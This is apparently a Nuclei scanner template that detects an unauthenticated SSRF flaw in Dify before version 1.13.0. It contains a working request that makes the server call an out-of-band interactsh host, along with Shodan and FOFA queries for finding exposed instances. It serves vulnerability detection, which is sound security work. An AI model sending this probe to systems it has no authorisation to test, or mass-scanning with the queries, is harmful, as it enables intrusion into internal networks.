id: dify-console-api-remote-files-upload-unauth-ssrf
info:
  name: Dify 未授权 SSRF 漏洞
  author: 0x_Akoko
  severity: high
  description: 检测到 Dify 1.13.0 版本之前的实例存在未授权的服务端请求伪造（SSRF）漏洞。该漏洞位于 /console/api/remote-files/upload
    接口，攻击者可通过传入用户可控的 URL 参数，利用服务端发起 HTTP 请求。由于缺乏身份验证及 SSRF 防护机制（如私有 IP 地址拦截），攻击者可利用此漏洞探测内网或访问敏感资源。
  reference:
  - https://github.com/langgenius/dify/security/advisories/GHSA-8235-vv5j-mmvg
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-918
  metadata:
    verified: true
    max-request: 2
    vendor: langgenius
    product: dify
    shodan-query: title:"Dify"
    fofa-query: title="Dify" || body="dify"
  tags: dify
flow: http(1) && http(2)
http:
- raw:
  - |
    GET / HTTP/1.1
    Host: {{Hostname}}
  host-redirects: true
  max-redirects: 2
  matchers:
  - type: dsl
    dsl:
    - contains_any(body, "<title>Dify</title>", "dify")
    condition: and
    internal: true
- raw:
  - |
    POST /console/api/remote-files/upload HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {"url":"http://{{interactsh-url}}/ssrf-test"}
  matchers:
  - type: dsl
    dsl:
    - contains(interactsh_protocol, "http")
    condition: and
